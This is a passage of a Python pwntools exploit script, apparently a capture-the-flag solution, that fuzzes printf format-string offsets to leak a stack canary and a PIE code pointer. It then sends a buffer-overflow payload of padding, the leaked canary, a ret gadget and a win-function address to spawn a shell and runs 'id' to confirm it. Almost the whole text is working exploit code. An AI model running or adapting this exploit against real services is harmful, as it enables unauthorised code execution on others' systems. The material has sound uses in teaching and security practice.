    """fuzz %1..%44 -> (canary_idx, [code_idx candidates, reliable first])"""
    canary_idx, code = None, []
    for i in range(1, 45):
        v = leak_at(i)
        if v is None:
            continue
        if canary_idx is None and is_canary(v):
            canary_idx = i
            print(f"  [%{i:>2}$p] = {v:#018x}  <-- CANARY slot")
        if is_code(v):
            code.append((i, v & 0xfff))
            print(f"  [%{i:>2}$p] = {v:#014x}  <-- CODE ptr (base={v & ~0xfff:#x})")
    order = {0x992: 0, 0xa90: 1, 0x780: 2, 0x7aa: 3}   # &main, csu, _start first
    code = [i for i, off in sorted(code, key=lambda t: order.get(t[1], 9))]
    return canary_idx, code

def try_pwn(canary_idx, code_idx):
    p = conn()
    p.sendafter(b"streak? ", b"%%%d$p.%%%d$p\x00" % (canary_idx, code_idx))
    p.recvuntil(b"streak: ")
    parts = p.recvline().split(b".")
    ch, dh = hexes(parts[0]), hexes(parts[1]) if len(parts) > 1 else []
    if not ch or not dh:
        p.close(); return None
    canary, codep = ch[0], dh[0]
    if not is_code(codep):               # re-validate: slot may be garbage this run
        p.close(); return None
    base = codep & ~0xfff                 # page-align down -> PIE base
    p.recvuntil(b"miss you")
    p.sendline(b"A"*PAD + p64(canary) + b"B"*8 + p64(base+RET_OFF) + p64(base+WIN_OFF))
    p.sendline(b"id")
    out = p.recvrepeat(1.5)
    if b"uid=" in out:
        who = out.split(b'uid=')[1].splitlines()[0].decode(errors='replace')
        print(f"[+] SHELL! canary={canary:#x} base={base:#x}  (uid={who})")
        return p
    p.close(); return None

for attempt in range(1, ATTEMPTS + 1):
    print(f"[*] attempt {attempt}: fuzzing format-string offsets...")
    canary_idx, code = find_slots()
    if canary_idx is None or not code:
        print("    (no code ptr survived on the stack this run, retrying)")
        continue
    for ci in code[:6]:
        print(f"[*] trying canary=%{canary_idx}$p  code=%{ci}$p ...")
        sh = try_pwn(canary_idx, ci)
        if sh:
            sh.interactive()
            sys.exit(0)
sys.exit("[-] gave up after retries")
